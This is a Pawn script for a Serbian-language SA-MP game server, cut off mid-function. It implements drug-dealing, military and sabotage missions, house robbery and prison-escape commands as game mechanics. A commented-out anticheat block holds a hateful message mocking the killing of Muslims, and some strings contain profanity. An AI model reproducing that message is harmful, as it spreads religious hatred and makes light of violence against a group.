CMD:kupisemedroge(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Samo diler!");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0,1937.1750, -1984.4272, 13.5469)) return SendErrorMessage(playerid, "Nisi na mestu! /dilerhelp");
	new seme;
	if(sscanf(params, "i", seme)) return SendUsageMessage(playerid, "/kupisemedroge [KOLICINA] ( 1 seme = 50$ )");
	if(seme > 100 || seme < 1) return SendErrorMessage(playerid, "Ne mozes vise od 100 semena odjednom!");
    new novac = seme * 50;
    if(GetPlayerMoney(playerid) < novac) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
	PlayerInfo[playerid][xSeme] += seme;
	DajIgracuNovac(playerid, -novac);
	SendInfoMessage(playerid, "Uspesno si kupio %d semena za %d $", seme, novac);
	return 1;
}

CMD:preradidrogu(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Samo diler!");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1435.7037, -963.8199, 201.0211)) return SendErrorMessage(playerid, "Nisi na mestu! /dilerhelp");
	if(PlayerInfo[playerid][xNeoDroga] < 1) return SendErrorMessage(playerid, "Nemas neobradjene droge!Posadi semena!");
	new nesto = PlayerInfo[playerid][xNeoDroga] / 2;
	SendInfoMessage(playerid, "Preradio si %d grama neobradjene droge u %d grama droge! Sada idi i prodaj je!", PlayerInfo[playerid][xNeoDroga], nesto);

	PlayerInfo[playerid][xDrogaPosao] += nesto;
	PlayerInfo[playerid][xNeoDroga] = 0;
	return 1;
}

CMD:prodajdrogu(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Samo diler!");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, 902.5450,-1819.6349,12.5567)) return SendErrorMessage(playerid, "Nisi na mestu! /dilerhelp");
	if(PlayerInfo[playerid][xDrogaPosao] == 0) return SendErrorMessage(playerid, "Nemas droge! Idi radi posao!");
	new plata = PlayerInfo[playerid][xDrogaPosao] * PlataPosla[PLATA_DILER];

	if(ServerInfo[HappyJob] == POSAO_DILER) {
        dajPlatuIgracu(playerid, plata * 2);
        SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
    }
    else dajPlatuIgracu(playerid, plata);

    BussinesJobMoney(POSAO_DILER, plata/2);
	PlayerInfo[playerid][xDrogaPosao] = 0;
	SendInfoMessage(playerid, "Diler: Lepo je poslovati sa tobom! Sada bezi da nas ne uhvate!");
	return 1;
}

CMD:dilerhelp(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Samo diler!");
	SPD(playerid, DIALOG_DILERHELP, DIALOG_STYLE_LIST, "Diler Help", "Prerada Droge CP\nKupovina Semena CP\nProdaja Droge CP", "Odaberi", "Odustani");
	return 1;
}

timer IspitivanjePreminulog[10000](playerid)
{
	TogglePlayerControllable(playerid, 1);
	SendInfoMessage(playerid, "Pritisni tipku N da pokupis telo i ubaci ga sa istom tipkom iza ambulantnih kola!");
	UbacujeTelo[playerid] = 1;
	return 1;
}

//========================================== [ VOJNIK KOMANDE ] ========================================

CMD:vojnikmisije(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_VOJNIK) return SendErrorMessage(playerid, "Samo vojnik!");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, 414.6642,2535.1963,19.1484)) return SendClientMessage(playerid, -1, "Nisi na mestu!");
	if(RadiVojnik{playerid} == true) return VojnikMessage(playerid, "Vec imas aktiviranu misiju!");
    if(radiVojnik2[playerid]) return VojnikMessage(playerid, "Vec imas aktiviranu misiju!");
    if(GetPlayerVirtualWorld(playerid) != 0) return VojnikMessage(playerid, "Virtual World mora biti 0!");
	ShowPlayerDialog(playerid, DIALOG_VOJNIKMISIJE, DIALOG_STYLE_LIST, "Odabir Misija", "Pronalazak vakcine\nKradja Dokumenata", "Potvrdi", "Odustani");
	return 1;
}

CMD:vojnikoprema(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_VOJNIK) return SendErrorMessage(playerid, "Samo vojnik!");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, 409.3252, 2528.0249, 16.5753)) return SendClientMessage(playerid, -1, "Nisi na mestu!");
	if(!RadiVojnik{playerid} && !radiVojnik2[playerid]) return VojnikMessage(playerid, "Nisi uzeo misiju!");
	//if(UzeoOpremuVojnik{playerid}) return VojnikMessage(playerid, "Vec si uzeo opremu!");
	ApplyAnimation(playerid, "CLOTHES", "CLO_Buy", 4.1, 1, 1, 1, 0, 0, 1);

	Novi_SetPlayerHealth(playerid, 150.0);
	Novi_SetPlayerArmour(playerid, 100.0);
    PostaviSkin(playerid, 287);
	
    if(RadiVojnik{playerid}) {

        GiveWeaponToPlayer(playerid, 31, 300);
        Novi_SetPlayerCheckpoint(playerid, 390.7900,2538.4006,16.5425, 2.0);
        VojnikMisijaJedanCP{playerid} = 2;
    }
    else if(radiVojnik2[playerid]) {

        GiveWeaponToPlayer(playerid, 34, 30);
        Novi_SetPlayerCheckpoint(playerid, 374.9060,2537.3120,16.5644, 2.0);
        vojnik2CP[playerid] = 2;
    }

	UzeoOpremuVojnik{playerid} = true;
	defer TimerZaVojnikOpremu(playerid);
	VojnikMessage(playerid, "Sada si spreman! Idi na CheckPoint!");
	return 1;
}

//========================================== [ VOJNIK TIMERI ] ========================================

timer TimerZaVojnikOpremu[1000](playerid)
{
	ClearAnimations(playerid);
	return 1;
}

timer GeneralPricaTimer[5000](playerid)
{
	ApplyActorAnimation(GeneralActor, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 5000);
	switch(GeneralTimer{playerid})
	{
		case 7:
		{
			VojnikMessage(playerid, "General: Znaci ti si ta budala koja se odlucila za ovakvu misiju!");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 6:
		{
			VojnikMessage(playerid, "General: Odlicno, retkost je videti hrabrost u vojniku u ovo vreme!");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 5:
		{
			VojnikMessage(playerid, "General: Tvoj zadatak je sledeci..");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 4:
		{
			VojnikMessage(playerid, "General: Treba da odes u napustenu vojnu bazu i pronadjes vakcinu!");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 3:
		{
			VojnikMessage(playerid, "General: Kada je pronadjes, doneces je ovde!");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 2:
		{
			VojnikMessage(playerid, "General: Ali pazi! Vecina baze je minirano!");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 1:
		{
			VojnikMessage(playerid, "General: Prvo idi i uzmi opremu! Srecno vojnice!");
			GeneralTimer{playerid}--;
			defer GeneralPricaTimer(playerid);
			return 1;
		}
		case 0:
		{
			ClearActorAnimations(GeneralActor);
			VojnikMessage(playerid, "Prvo uzmi opremu!");
			TogglePlayerControllable(playerid, 1);
			SetCameraBehindPlayer(playerid);
			return 1;
		}
	}
	return 1;
}

timer TimeDeset[10000](playerid)
{
	TextDrawHideForPlayer(playerid, BlackTD);
	ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.1, 1, 1, 1, 0, 0, 1);
	VojnikMessage(playerid, "Izgleda da si zgazio na minu i unistio vozilo!");
	VojnikMessage(playerid, "Usresredi se na misiju vojnice, stisni zube i ustaj!!!!!");
	GameTextForPlayer(playerid, "Pritisni tipku SPACE da ustanes", 5000, 3);
	return 1;
}

timer JosJedan[500](playerid)
{
	ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 0, 0, 1);
	TogglePlayerControllable(playerid, 0);
	Novi_DestroyVehicle(VojnikMisijaJedanVozilo[playerid]);
	TextDrawShowForPlayer(playerid, BlackTD);
	TrebaDaUstane{playerid} = true;
	return 1;
}

timer TimerPozivGeneral[7000](playerid)
{
	VojnikMessage(playerid, "Vojnice dosli smo po tebe! Ispred te cekamo se helikopoterom!");
	Novi_SetPlayerCheckpoint(playerid, 213.6725, 1888.3477, 14.8278, 2.0);
	VojnikMisijaJedanCP{playerid}++;
	return 1;
}

timer TimerZaActoreNormal[10000]()
{
	ClearActorAnimations(NaucnikActor);
	ClearActorAnimations(NaucnikActor1);
	ClearActorAnimations(Kapetan1);
	ClearActorAnimations(Kapetan2);
}

//======================================== [ SABOTAZER TIMERI ] =================================//

timer SabotazerPricaTimer[5000](playerid)
{
	switch(PricaSabotazerTimer{playerid})
	{
		case 2:
		{
			SendSabotage(playerid, "Sef: Ej dosao si! Imam zadatak za tebe! Na onom brodu tamo!");
			PricaSabotazerTimer{playerid}--;
			InterpolateCameraPos(playerid, -2622.250976, 1434.504028, 11.227024, -2582.955566, 1532.342285, 36.671371, 5000);
			InterpolateCameraLookAt(playerid, -2618.288085, 1432.552001, 8.884929, -2578.019042, 1532.377563, 35.877864, 5000);
			defer SabotazerPricaTimer(playerid);
			return 1;
		}
		case 1:
		{
			SendSabotage(playerid, "Sef: Na onom brodu se nalazi eksploziv! Potrebno je da ga aktiviras!");
			PricaSabotazerTimer{playerid}--;
			InterpolateCameraPos(playerid, -2582.955566, 1532.342285, 36.671371, -2343.771484, 1429.718505, 62.980632, 5000);
			InterpolateCameraLookAt(playerid, -2578.027832, 1532.134765, 35.850879, -2345.431396, 1434.110839, 61.262474, 5000);
			defer SabotazerPricaTimer(playerid);
			return 1;
		}
		case 0:
		{
			SendSabotage(playerid, "Sef: Kreni polako! Evo ti pistolj za svaki slucaj! Srecno!");
			PricaSabotazerTimer{playerid}--;
			GiveWeaponToPlayer(playerid, 23, 10);
			InterpolateCameraPos(playerid, -2343.771484, 1429.718505, 62.980632, -2449.874755, 1554.372192, 35.331195, 5000);
			InterpolateCameraLookAt(playerid, -2345.431396, 1434.110839, 61.262474, -2454.580566, 1552.774658, 34.781528, 5000);
			defer Timer5(playerid);
			return 1;
		}
	}
	return 1;
}

timer Timer5[5000](playerid)
{
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, 1);
	Novi_SetPlayerCheckpoint(playerid, -2604.3354,1438.6733,7.3366, 2.0);
	SabotazerPosloviCP{playerid} = 2;
	SendSabotage(playerid, "Idi na brod!");
	return 1;
}

IgracSePenje(playerid,Float:x,Float:y,Float:z)
{
	ApplyAnimation(playerid,"PED","CLIMB_pull",1,0,1,1,0,1000);
	SetTimerEx("VeloCity",1000,false,"i",playerid);
	SetTimerEx("Teleport",1500,false,"ifff",playerid,x,y,z);
	return 1;
}

forward VeloCity(playerid);
public VeloCity(playerid)
{
	return SetPlayerVelocity(playerid,0,0,1);
}

forward Teleport(playerid,Float:x,Float:y,Float:z);
public Teleport(playerid,Float:x,Float:y,Float:z)
{
	return SetPlayerPos(playerid,x,y,z);
}

timer PostavljaBombuTimer[5000](playerid)
{
	Novi_SetPlayerCheckpoint(playerid, -2466.6880,1546.9880,23.6641, 2.0);
	TogglePlayerControllable(playerid, 1);
	SabotazerPosloviCP{playerid} = 11;
	SendSabotage(playerid, "Pronadji ulaz u kabinu!");
	return 1;
}

timer TimerOdPetSabotazer[2000](playerid)
{
	CreateExplosionForPlayer(playerid, -2413.4875,1543.5176,31.8594, 1, 45.0);
	defer TimerDrugi(playerid);
	return 1;
}

timer TimerDrugi[3000](playerid)
{
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, 1);
	SendSabotage(playerid, "Vrati se kod sefa da dobijes platu!");
	SabotazerPosloviCP{playerid} = 14;
	Novi_SetPlayerCheckpoint(playerid, -2614.8389,1430.6879,7.1607, 2.0);
	return 1;
}

ResetovanjeVoidovihVarijabli(playerid)
{

    skoroZauzimao[playerid] = 0;

    vrteoSkoro[playerid] = 0;

    PubgIgra[playerid] = false;
    PubgSkace[playerid] = false;

    oglasTimer[playerid] = 0;

    RouletteUlog[playerid] = 0;
    RouletteOdabir[playerid] = 0;
    RouletteIgra[playerid] = false;

    TacnihOdgovoraPD[playerid] = 0;

    resetWorkshopBuying(playerid);

    ProveraRanac[playerid] = -1;
    ProveraIgraca[playerid] = -1;

    robaOrganizaciju[playerid] = -1;
    robaOrganizacijuTime[playerid] = 0;
    prekinuoOrgRob[playerid] = false;

    inventorySlot[playerid] = -1;

    kopaKontenjer[playerid] = false;
    kopaKontenjerTimer[playerid] = 0;

    imaSrafciger[playerid] = false;

    poslaoTP[playerid] = -1;

    paparazoMeta[playerid] = 0;
    radiPaparazo[playerid] = false;

    radiElektricar[playerid] = 0;

    robaRafRolex[playerid] = false;

    // snowOn[playerid] = false;
    // nosiKapicu[playerid] = true;

    wastedTDShown[playerid] = false;

    radiPilot[playerid] = 0;
    pilotVozilo[playerid] = -1;

    ponudjenSavez[playerid] = -1;

    gDeathList[playerid] = false;

    astronautTDShowed[playerid] = false;
    astronautKey[playerid] = 0;
    astronautPopravkaBroj[playerid] = 0;

    prevoziDrva[playerid] = 0;
    posaoDrvaVozilo[playerid] = -1;
    // posaoDrvaObjekat[playerid] = -1;

    kosacVozilo[playerid] = -1;

    OdabraniIgracPosao[playerid] = -1;

    portSeIgrac[playerid] = false;

    radiAstronaut[playerid] = false;
    astronautCP[playerid] = 0;

    TrcanjeVarijabla[playerid] = 0;

    helperVeh[playerid] = -1;
    VPVeh[playerid] = -1;

    OdabranaOrgBoja[playerid] = 0;

    zaposljavanjeDelay[playerid] = false;

    RobaBanku[playerid] = false;
    PostaviBusilicu[playerid] = false;
    BusilicaTime[playerid] = 0;
    PokupiTorbu[playerid] = false;
    NosiBankaTorbu[playerid] = false;
    BombaTatice[playerid] = 0;
    UBanci[playerid] = false;

    helperUsed[playerid] = false;

    listenFamily[playerid] = false;

    KaznaIgraca[playerid] = -1;

    igracKrvari[playerid] = false;

    checkpointCheck[playerid] = false;
    TimerAutoPilot[playerid] = -1;
    autopilotID[playerid] = -1;
    CurrTarget[playerid] = 0;
    #if defined USE_TIMERS
    interval[playerid] = 250;
    #endif

    KreiraNargilu[playerid] = -1;
    NargilaTimer[playerid] = -1;
    UvukoDim[playerid] = 0;

    Ubio1[playerid] = false;
    Ubio2[playerid] = false;
    vojnik2Obj[playerid] = -1;
    GeneralTimer2[playerid] = 0;
    radiVojnik2[playerid] = false;
    vojnik2CP[playerid] = 0;
    vojnik2Veh[playerid] = -1;

    pornoCooldown[playerid] = 0;
    pornoProgress[playerid] = 0.0;
    radiPorno[playerid] = false;
    PornoBar[playerid] = INVALID_PLAYER_BAR_ID;

    chooseGun[playerid] = 0;

    radiLovac[playerid] = false;
    lovacCounter[playerid] = 0;

    requestStrike[playerid] = false,
    requestStrikeTime[playerid] = 0,
    requestStrikeTimer[playerid] = 0,
    strikeReady[playerid] = false,
    StrikeObject[playerid] = -1;
    bankaTDShown[playerid] = false;
    AirDropShown[playerid] = false;

    airdropActive[playerid] = false;
    playerHacking[playerid] = 0;
    playerHackingSifra[playerid] = 0;
    playerHackingNosi[playerid] = false;
    OpenCaseShown[playerid] = false;
    SpinInterval[playerid] = 0;
    PlayerCaseX[playerid] = 0;
    radiMisiju[playerid] = 0;
    misijaCounter[playerid] = 0;
    misijaNosi[playerid] = false;
    misijaVraca[playerid] = false;
    misijaKradja[playerid] = 0;
    misijaLaptop[playerid] = 0;
    RanjenIgrac[playerid] = false;
    RanjenIgracCount[playerid] = 0;
    SkoroPucao[playerid] = false;
    NosiVozilo[playerid] = 0;
    KupioVozilo[playerid] = 0;
    WorkShopVeh[playerid] = -1;
    WorkShopVehTow[playerid] = -1;
    WorkShopBuyModel[playerid] = 0;
    WorkShopBuyPrice[playerid] = 0;
    WorkShopBuyTow[playerid] = false;

    SelectedCar[playerid] = 0;
    WorkShopCarPrice[playerid] = 0;
    ModelOdabir[playerid] = 0;
    ProdajeKokain[playerid] = 0;
    UmroKoks[playerid] = 0;

    ProdajeKokainRange[playerid] = 0;
    NosiFavella[playerid] = 0;
    OrgVehBroj[playerid] = 0;
    OrgVehID[playerid] = -1;
    KreiraOrgVehPickup[playerid] = -1;

    OrgVeh[playerid] = -1;
    BitcoinCena[playerid] = 0;
    KokainTorba[playerid] = false;

    TrenutniKokain[playerid] = 0;
    PucanjeGumeBrojac[playerid] = 0;
    VoziKombi[playerid] = false;

    KoristiKran[playerid] = false;
    NosiKutijuMats[playerid] = false;
    NosiBrojMats[playerid] = -1;

    ItemUseTimer[playerid] = 0;
    ItemUseMedKit[playerid] = 0;

    NosiPaket[playerid] = false;

    UslikanSkoro[playerid] = false;
    PostavioRadar[playerid] = false;
    RadarObjekat[playerid] = -1;

    FlashTime[playerid] = false;
    ActiveFlash[playerid] = false;
    RadiMoler[playerid] = false;
    MolerCP[playerid] = 0;

	BolnicarPosloviCP[playerid] = 0;
	BolnicarVozilo[playerid] = 0;
	UbacujeTelo[playerid] = 0;

	RadiSabotazer{playerid} = false;
	SabotazerPosloviCP{playerid} = 0;
	PricaSabotazerTimer{playerid} = 0;
	SabotazerVozilo[playerid] = 0;
	UbioKapetana2{playerid} = 0;
	UbioKapetana1{playerid} = 0;
	UpucaKapetana{playerid} = 0;

	RadiVojnik{playerid} = false;
	VojnikMisijaJedanCP{playerid} = 0;
	VojnikMisijaJedanVozilo[playerid] = 0;
	GeneralTimer{playerid} = 0;
	UzeoOpremuVojnik{playerid} = false;
	Vakcina[playerid] = 0;
	UpucaoObjekat{playerid} = false;
	TrebaDaPokupiVakcinu{playerid} = false;
	TrebaDaUstane{playerid} = false;
	UbioActora{playerid} = false;
	UbioActora1{playerid} = false;
	UbioActora2{playerid} = false;
	UbioActora3{playerid} = false;
	UpucajNaucnika1{playerid} = false;
	UpucajNaucnika2{playerid} = false;
	UpucajNeprijatelja1{playerid} = false;
	UpucajNeprijatelja2{playerid} = false;

	FunRace{playerid} = false;
	FunRaceCP{playerid} = 0;
	FunRaceVoziloOff[playerid] = 0;

	RobMarketKurac{playerid} = 0;
	PrekinuoRob{playerid} = 0;
	RobTrafikaKurac{playerid} = 0;

	HungerGame{playerid} = false;
	KutijaTimer{playerid} = 0;
	OtvorioMegaKutiju{playerid} = 0;

	Rentao[playerid] = false;
	RentVozilo[playerid] = -1;

	IgracLeti{playerid} = false;

    NosiKutiju[playerid] = false;

    PozvaoAdvokata[playerid] = false;
    MojAdvokat[playerid] = -1;
    AdvokatPonuda[playerid] = 0;

    BezanjeZatvor[playerid] = 0;
    BezanjeZatvorVreme[playerid] = 0;

    UlicneTrkeID[playerid] = -1;

    UpucaoPolicajca[playerid] = false;
    UTutorialu[playerid] = false;
    TutorialCP[playerid] = 0;

    PostaviBusilicuZlatara[playerid] = false;
    BusilicaTimeZlatara[playerid] = 0;
    RobaZlataru[playerid] = false;
    PokupiTorbuZlatara[playerid] = false;
    PostaviBusilicuZlatara[playerid] = false;

    NosiZlataraTorbu[playerid] = false;

    MichaelMisija1CP[playerid] = false;
    MichaelMisija1CP2[playerid] = false;
    MichaelMisija1CP3[playerid] = false;

    VipGChat[playerid] = 0;
    VipFix[playerid] = 0;
    VipGoto[playerid] = 0;
    VipMenuTime[playerid] = 0;

    SpamKomandi[playerid] = 0;

	AktivnaIgra[playerid] = 0;

	PosloviCP[playerid] = false;

    DronVozi[playerid] = -1;
    DronTime[playerid] = 0;

    ProdajeImovinu[playerid] = false;

}

///////////////////

// task AntiSecaMuslimana[500]()
// {
// 	foreach(new i : Player)
// 	{
//         if(GetPlayerAnimationIndex(i))
//         {
//         	new animlib[32], animname[32];
//         	GetAnimationName(GetPlayerAnimationIndex(i), animlib, 32, animname, 32);
//         	if(!strcmp(animlib, "KNIFE", true) && !strcmp(animname, "KILL_PARTIAL", true))
//         	{
//         		ClearAnimations(i);
//         		SendErrorMessage(i, "Seci muslimane negde drugde pizda ti materina!!");
//                 format( globalstring, sizeof( globalstring ), "| V:AC | Moguca Seca Muslimana || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( i ), i );
//                 AdminPoruka( ANTICHEAT, globalstring );
//         	}
//         }

// 	}
// 	return 1;
// }

CMD:rent(playerid, params[])
{
	if(Rentao[playerid]) return SendClientMessage(playerid, -1, "Vec si rentao vozilo! /unrent");
	for(new r=0; r < MAX_RENTL; r++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, RentInfo[r][rPosX], RentInfo[r][rPosY], RentInfo[r][rPosZ])) {
			ShowPlayerDialog(playerid, DIALOG_RENTUZMI, DIALOG_STYLE_TABLIST_HEADERS, "Rent Lokacija", "Vozilo\tCena\nFaggio\t300$\nSentinel\t500$\nManana\t600$\nPremier\t400$\nAdmiral\t700$", "Potvrdi", "Odustani");
		}
	}
	return 1;
}

CMD:unrent(playerid, params[])
{
	if(!Rentao[playerid]) return SendClientMessage(playerid, -1, "Nisi rentao vozilo!");
	Novi_DestroyVehicle(RentVozilo[playerid]);
	Rentao[playerid] = false;
	RentVozilo[playerid] = -1;
	SendClientMessage(playerid, -1, "Vise ne rentas vozilo!");
	return 1;
}

CMD:fly(playerid, params[])
{
	if(PlayerInfo[playerid][xAdmin] < 5) return SendErrorMessage(playerid, "Nisi ovlascen!");
	if(IgracLeti{playerid})
	{
		StopFly(playerid);
		IgracLeti{playerid} = false;
		return 1;
	}
	else if(!IgracLeti{playerid})
	{
		StartFly(playerid);
		IgracLeti{playerid} = true;
		return 1;
	}
	return 1;
}

// ptask RandomServerPoruke[10000](playerid) {

//     if( TogHud[ playerid ] ) return 0;

//     PlayerTextDrawSetString(playerid, RandomSPorukeTD[playerid], RandomSPoruke[random(sizeof(RandomSPoruke))]);
// 	return 1;
// }

CMD:robhouse(playerid) {

	for( new i= 1; i < MAX_IMOVINA; i++) {

		if(IsPlayerInRangeOfPoint(playerid, 2.0, II[i][iEnter][0], II[i][iEnter][1], II[i][iEnter][2])) {

			if( GetFactionType( playerid ) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_MAFIJA ) return SendErrorMessage(playerid, "Ti ne mozes to!");
	
			new hours;
			gettime(hours);
			if(hours > 7 && hours < 24) return SendErrorMessage(playerid, "Robanje mozes samo od 00:00 do 07:00!");

			if(PlayerInfo[playerid][xRobanjeKuce] >= 1) return va_SendClientMessage(playerid, -1, ""col_crvena"[GRESKA] "col_white"Sledece robanje se moze pokrenuti za %d minuta!", PlayerInfo[playerid][xRobanjeKuce]);
			if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");
			if( GetPlayerWeapon(playerid) == 0) return SendErrorMessage(playerid, "Morate imati oruzije kod sebe!");
			TimerRobHouse = defer RobHouseTime(playerid, i);
			RobHouseCount[playerid] = HouseRobTime;
			SendInfoMessage(playerid, "Zapoceli ste pljackanje kuce! Morate ostati u blizini kuce!");
			return 1;
		}
		
	}
	return 1;
}

timer RobHouseTime[1000](playerid, i) {

	if(RobHouseCount[playerid] >= 1) {

		if(!IsPlayerInRangeOfPoint(playerid, 15.0, II[i][iEnter][0], II[i][iEnter][1], II[i][iEnter][2])) {

			stop TimerRobHouse;
			RobHouseCount[playerid] = 0;
			PostaviWanted(playerid, "Neuspela Pljacka Kuce", "Nepoznat", 2);
			SendErrorMessage(playerid, "Napustio si okolinu kuce i rob se prekinuo!");
			PlayerInfo[playerid][xRobanjeKuce] = 10;
			return 1;
		}

		va_GameTextForPlayer(playerid, "%d", 1000, 4, RobHouseCount[playerid]);
		RobHouseCount[playerid]--;
		TimerRobHouse = defer RobHouseTime(playerid, i);
		return 1;
	}
	else {

		stop TimerRobHouse;
		RobHouseCount[playerid] = 0;
		PostaviWanted(playerid, "Pljacka Kuce", "Nepoznat", 4);
		SendInfoMessage(playerid, "Pljacka kuce uspesna! Dobio si %d$!", RobHousePrice);
		DajIgracuNovac(playerid, RobHousePrice);
		PlayerInfo[playerid][xRobanjeKuce] = 45;
		return 1;
	}
}

ptask RobKuceCountDown[60000](playerid) {

    if(IsPlayerNPC(playerid)) return 1;
	if(PlayerInfo[playerid][xRobanjeKuce] == 0) return 1;
	PlayerInfo[playerid][xRobanjeKuce]--;
	return 1;
}

ptask RobMarketCountDown[60000](playerid) {

    if(IsPlayerNPC(playerid)) return 1;
    if(PlayerInfo[playerid][xRobanjeMarketa] == 0) return 1;
    PlayerInfo[playerid][xRobanjeMarketa]--;
    return 1;
}

ptask RobTrafikaCountDown[60000](playerid) {

    if(IsPlayerNPC(playerid)) return 1;
    if(PlayerInfo[playerid][xRobanjeTrafike] == 0) return 1;
    PlayerInfo[playerid][xRobanjeTrafike]--;
    return 1;
}

timer TimerParSekundi[2000](playerid) {

	RobHouseCount[playerid] = 0;
	return 1;
}

CMD:pokupikutiju(playerid) {

    if(PlayerInfo[playerid][xZatvor] != OBICAN_ZATVOR) return SendErrorMessage(playerid, "Nisi u zatvoru!");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1419.2917,-1478.0883,101.7550)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(NosiKutiju[playerid]) return SendErrorMessage(playerid, "Vec nosis kutiju! /ostavikutiju");
    NosiKutiju[playerid] = true;
    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
    SetPlayerAttachedObject(playerid, OBJECT_NOSI, 1271, 1, -0.064613, 0.520760, 1.0, 0.0, 84.217391, 0.0, 1.0, 1.0, 1.0);
    Novi_SetPlayerCheckpoint(playerid, -1449.0287,-1593.5349,101.7578, 3.0);
    SendInfoMessage(playerid, "Odnesi kutiju na lokaciju! Moras da setas! Default dugme : ALT!");
    return 1;
}

CMD:ostavikutiju(playerid) {

    if(PlayerInfo[playerid][xZatvor] != OBICAN_ZATVOR) return SendErrorMessage(playerid, "Nisi u zatvoru!");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1449.0287,-1593.5349,101.7578)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(!NosiKutiju[playerid]) return SendErrorMessage(playerid, "Ne nosis kutiju! /pokupikutiju");
    NosiKutiju[playerid] = false;
    RemovePlayerAttachedObject(playerid, OBJECT_NOSI);
    SetPlayerSpecialAction(playerid, 0);
    PlayerInfo[playerid][xZatvorVreme] -= 2;
    SendInfoMessage(playerid, "Uspesno si odneo kutiju i skinuo 2 minuta kazne!");
    return 1;
}

ptask ProveraZatvorKutija[100](playerid) {

    if(IsPlayerNPC(playerid)) return 1;
    if(!NosiKutiju[playerid]) return 0;
    enum
    {
        Float:X = 0,
        Float:Y,
        Float:Z
    }

    new Float:Vel[3];
    GetPlayerVelocity(playerid, Vel[X], Vel[Y], Vel[Z]);

    if(Vel[X] > 0.05 || Vel[X] < -0.08 || Vel[Y] > 0.05 || Vel[Y] < -0.08)
    {
        SetCameraBehindPlayer(playerid);
        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
        TogglePlayerControllable(playerid, 0);
        new Float:PosX, Float:PosY, Float:PosZ;
        GetPlayerPos(playerid, PosX, PosY, PosZ);
        Novi_SetPlayerPos(playerid, PosX, PosY, PosZ);
        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);\
        SendInfoMessage(playerid, "Moras polako da ides! Drzi ALT!");
        return 1;
    }
    return 1;
}

CMD:bezanjezatvor(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1463.2039,-1547.4755,101.8390)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(PlayerInfo[playerid][xZatvor] != OBICAN_ZATVOR) return SendErrorMessage(playerid, "Ne mozes to!");
    if(PlayerInfo[playerid][xLevel] < 4) return SendErrorMessage(playerid, "Ovo moze samo level 4+!");
    if(PozvaoAdvokata[playerid]) return SendErrorMessage(playerid, "Ne mozes to ako si pozvao advokata! /odbijpoziv");
    if(GetPlayerMoney(playerid) < 15000) return SendErrorMessage(playerid, "Zasto uopste dolazis kod mene ako nemas pare? Odjebi! (8.000$)");
    PlayerInfo[playerid][xTurpija] = 1;
    GiveWeaponToPlayer(playerid, 46, 1);
    DajIgracuNovac(playerid, -15000);
    Novi_SetPlayerCheckpoint(playerid, -1463.7583,-1591.4882,101.7578, 2.0);
    SendInfoMessage(playerid, "Idi na lokaciju da iskoristis kupljenu turpiju i padobran!");
    BezanjeZatvor[playerid] = 1;
    return 1;
}

timer BezanjeZatvorCount[1000](playerid) {

    if(BezanjeZatvorVreme[playerid] != 0)
    {
        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, BezanjeZatvorVreme[playerid]);
        BezanjeZatvorVreme[playerid] --;
        defer BezanjeZatvorCount(playerid);
        return 1;
    }
    else
    {
        BezanjeZatvorVreme[playerid] = 0;
        SendInfoMessage(playerid, "Alarm se aktivirao! Skoci sa padobranom i pobegni!!");
        PostaviWanted(playerid, "Bezanje iz zatvora", "Zatvorska Ustanova", 10);
        Novi_SetPlayerPos(playerid, -1467.3500,-1591.4200,101.7578);
        TogglePlayerControllable(playerid, true);
        Novi_SetPlayerCheckpoint(playerid, -1475.5144,-1608.2803,102.5532, 5.0);
        SetPlayerWorldBounds( playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
        BezanjeZatvor[playerid] = 2;
        foreach(Player, i) {

            if(GetFactionType(playerid) == ORG_TIP_PD) {

                SendClientMessage(playerid, -1, ""col_crvena"[ZATVOR]"col_white"Upravo se desio beg u zatvoru! Sve jedinice neka krenu!");
            }
        }
        return 1;
    }
}

timer NekiTamoTimer[15000](playerid) {

    if(BezanjeZatvor[playerid] == 2) {

        SendInfoMessage(playerid, "Beg iz zatvora neuspesan! Vracas se nazad sa produzenom kaznom!");
        Novi_SetPlayerHealth(playerid, 0);
